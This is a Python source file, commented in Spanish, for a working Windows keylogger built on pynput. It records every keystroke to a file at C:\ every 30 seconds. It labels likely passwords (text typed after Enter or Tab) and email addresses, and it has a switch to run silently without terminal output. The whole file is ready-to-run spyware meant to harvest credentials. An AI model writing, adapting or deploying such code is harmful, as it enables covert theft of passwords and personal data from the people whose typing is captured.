import pynput
from pynput import keyboard
import time
import os
import pathlib
import sys
import datetime
import threading

# --- Configuración ---

# Define el nombre del archivo donde se guardarán las pulsaciones
# Ahora se guarda directamente en la raíz de C:\
# IMPORTANTE: Esto generalmente requiere permisos de Administrador para escribir en C:\
LOG_FILE = pathlib.Path("C:/") / "log_pulsaciones_continuo.txt"
# LOG_FILE = pathlib.Path(r"C:\log_pulsaciones_continuo.txt") # Alternativa

# Lista de TLDs comunes para la detección (puedes añadir más)
COMMON_TLDS = [".com", ".mx", ".org", ".net", ".gov", ".edu", ".io", ".co", ".info", ".biz", ".es"]

# Intervalo para guardar el buffer en el archivo (en segundos)
SAVE_INTERVAL_SECONDS = 30

# --- Modo Debug ---
# Establece a True para imprimir las pulsaciones en la terminal
# Establece a False para ejecutar de forma silenciosa (solo guarda en archivo)
DEBUG_MODE = True # <<--- AQUÍ CONTROLAS EL MODO DEBUG

# --- Buffers y Locks ---

# Buffer en memoria para almacenar las entradas de log antes de escribirlas al archivo
LOG_BUFFER = []
# Lock para asegurar que el acceso a LOG_BUFFER sea seguro desde diferentes hilos
LOG_BUFFER_LOCK = threading.Lock()

# Buffer temporal para acumular caracteres tecleados entre teclas especiales
CHAR_BUFFER = []

# --- Variables de Estado para Detección Heurística ---
# Flag para señalar que la siguiente secuencia de caracteres podría ser una contraseña
# Se activa después de Enter o Tab. Se consume y resetea en flush_char_buffer_to_log.
last_key_was_password_separator = False


# --- Funciones de Detección Heurística ---

def is_potential_email(chars_list):
    """Verifica si el contenido de la lista de caracteres parece un email (heurística simple)."""
    buffer_string = "".join(chars_list)
    if '@' in buffer_string:
        parts = buffer_string.split('@')
        if len(parts) == 2 and '.' in parts[1]:
             return True
    return False

def ends_with_common_tld(chars_list, tlds):
    """Verifica si el contenido de la lista de caracteres termina con alguno de los TLDs comunes."""
    buffer_string = "".join(chars_list).lower()
    for tld in tlds:
        if buffer_string.endswith(tld.lower()):
            return True
    return False

# --- Función para Procesar el Buffer de Caracteres y Añadir al Log ---

def flush_char_buffer_to_log():
    """
    Procesa el contenido actual de CHAR_BUFFER, aplica heurísticas,
    formatea la entrada y la añade a LOG_BUFFER. Limpia CHAR_BUFFER y ajusta el estado.
    """
    global CHAR_BUFFER, LOG_BUFFER, LOG_BUFFER_LOCK, last_key_was_password_separator, DEBUG_MODE

    if not CHAR_BUFFER:
        if last_key_was_password_separator:
             last_key_was_password_separator = False
        return

    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    buffer_string = "".join(CHAR_BUFFER)
    log_entry = f"[{timestamp}] "

    if last_key_was_password_separator:
        log_entry += "[POTENTIAL_PASSWORD_FIELD] "
        last_key_was_password_separator = False

    if is_potential_email(CHAR_BUFFER):
        log_entry += "[POTENTIAL_EMAIL] "

    if ends_with_common_tld(CHAR_BUFFER, COMMON_TLDS):
         tld_found = next((tld for tld in COMMON_TLDS if buffer_string.lower().endswith(tld.lower())), "TLD")
         log_entry += f"[ENDS_WITH_TLD:{tld_found.upper().strip('.')}] "

    log_entry += buffer_string

    # --- Modo Debug: Imprimir en Terminal ---
    if DEBUG_MODE:
        print(log_entry) # Imprime la entrada procesada en la terminal

    # --- Añadir al Buffer de Log ---
    with LOG_BUFFER_LOCK:
        LOG_BUFFER.append(log_entry)

    # Limpiar el buffer de caracteres
    CHAR_BUFFER.clear()


# --- Función para Guardar el Buffer de Log al Archivo ---

def save_log_buffer():
    """
    Guarda el contenido actual de LOG_BUFFER al archivo de log y limpia LOG_BUFFER.
    Es thread-safe usando LOG_BUFFER_LOCK.
    """
    global LOG_BUFFER, LOG_BUFFER_LOCK, DEBUG_MODE

    if LOG_BUFFER_LOCK.acquire(blocking=False):
        try:
            if LOG_BUFFER:
                timestamp_save = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                # Este print aparece independientemente del modo debug, indica el guardado
                print(f"[*] Guardando {len(LOG_BUFFER)} entradas al archivo a las {timestamp_save}...")

                # Abre el archivo en la ruta C:\
                with open(LOG_FILE, "a", encoding='utf-8', newline='') as f:
                    for entry in LOG_BUFFER:
                        f.write(entry + '\n')

                LOG_BUFFER.clear()
                print("[*] Guardado completado.")

        except Exception as e:
            print(f"Error al guardar el buffer en '{LOG_FILE}': {e}", file=sys.stderr)
        finally:
            LOG_BUFFER_LOCK.release()


# --- Manejadores de Eventos de Teclado ---

def on_press(key):
    """Maneja las pulsaciones de teclas (cuando se presionan)."""
    global CHAR_BUFFER, LOG_BUFFER, LOG_BUFFER_LOCK, last_key_was_password_separator, DEBUG_MODE

    try:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        special_key_entry = None

        try:
            char = key.char
            if char is not None:
                 CHAR_BUFFER.append(char)
                 return # Procesa el carácter y sale.

        except AttributeError:
            pass # Es una tecla especial, continúa abajo.

        # --- Manejo de Teclas Especiales ---
        # Procesar cualquier carácter acumulado ANTES de la tecla especial
        flush_char_buffer_to_log()

        # Ahora, loggear la tecla especial
        if key == keyboard.Key.space:
             special_key_entry = f"[{timestamp}] [SPACE]"
             last_key_was_password_separator = False

        elif key == keyboard.Key.enter:
             special_key_entry = f"[{timestamp}] [ENTER]"
             last_key_was_password_separator = True

        elif key == keyboard.Key.tab:
             special_key_entry = f"[{timestamp}] [TAB]"
             last_key_was_password_separator = True

        elif key == keyboard.Key.backspace:
             special_key_entry = f"[{timestamp}] [BACKSPACE]"
             last_key_was_password_separator = False

        elif key == keyboard.Key.shift or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or \
             key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr or key == keyboard.Key.cmd or key == keyboard.Key.cmd_r:
             try:
                 special_key_entry = f"[{timestamp}] [{key.name.upper()}_PRESS]"
                 last_key_was_password_separator = False
             except AttributeError:
                 special_key_entry = f"[{timestamp}] [UNKNOWN_MODIFIER:{key}]"
                 last_key_was_password_separator = False

        else:
            try:
                special_key_entry = f"[{timestamp}] [{key.name.upper()}]"
                last_key_was_password_separator = False
            except AttributeError:
                special_key_entry = f"[{timestamp}] [UNKNOWN_KEY:{key}]"
                last_key_was_password_separator = False

        # --- Modo Debug: Imprimir Tecla Especial ---
        if DEBUG_MODE and special_key_entry:
             print(special_key_entry) # Imprime la tecla especial en la terminal

        # --- Añadir al Buffer de Log ---
        if special_key_entry:
            with LOG_BUFFER_LOCK:
                LOG_BUFFER.append(special_key_entry)

    except Exception as e:
         error_timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         error_entry = f"[{error_timestamp}] [FATAL_ERROR_IN_ON_PRESS: {e}] - Key: {key}"
         print(error_entry, file=sys.stderr)
         # Si hay un error fatal, también lo añadimos al buffer de log
         with LOG_BUFFER_LOCK:
             LOG_BUFFER.append(error_entry)


# La función on_release no se usa para detener en este script.
def on_release(key):
    """Maneja la liberación de teclas (no se usa para detener aquí)."""
    pass


# --- Ejecución Principal ---

print(f"[*] Keylogger Continuo iniciando.")
print(f"[*] Guardando pulsaciones en: {LOG_FILE}")
print(f"[*] El buffer se guardará al archivo cada {SAVE_INTERVAL_SECONDS} segundos.")
print(f"[*] Buscaremos patrones simples (email, TLDs {', '.join(COMMON_TLDS)}, campo de contraseña).")
if DEBUG_MODE:
    print("[*] MODO DEBUG ACTIVADO: Las pulsaciones se imprimirán en esta terminal.")
else:
    print("[*] MODO SILENCIOSO ACTIVADO: Las pulsaciones NO se imprimirán en esta terminal (solo en archivo).")
print("[*] Para detener completamente el script, debes usar el Administrador de Tareas (Ctrl+Shift+Esc).")
print("\n*** RECUERDA: Ejecuta este script/exe COMO ADMINISTRADOR para escribir en C:\ ***")


listener = keyboard.Listener(on_press=on_press, on_release=on_release)

try:
    listener.start()
    print(f"[*] Captura de teclas iniciada. Ejecutándose continuamente.")

    # Bucle principal que se ejecuta en el hilo principal
    while True:
        time.sleep(SAVE_INTERVAL_SECONDS)
        save_log_buffer() # Llama a la función de guardado

# Manejo de Ctrl+C
except KeyboardInterrupt:
    print("\n[*] Detectado Ctrl+C. Intentando detener el script de forma limpia.", file=sys.stderr)
    flush_char_buffer_to_log() # Procesa el buffer final
    save_log_buffer() # Guarda los datos pendientes
    if listener and listener.running:
         listener.stop()
         listener.join()
    print("[*] Script detenido por KeyboardInterrupt.")

# Manejo de otros errores
except Exception as e:
    print(f"[*] Error fatal inesperado en hilo principal: {e}", file=sys.stderr)
    flush_char_buffer_to_log()
    save_log_buffer()
    if listener and listener.running:
        listener.stop()
        listener.join()
    print("[*] Script detenido debido a un error fatal.")


# Este print final solo se alcanzará si el script sale por una excepción manejada.
print("[*] Programa finalizado.")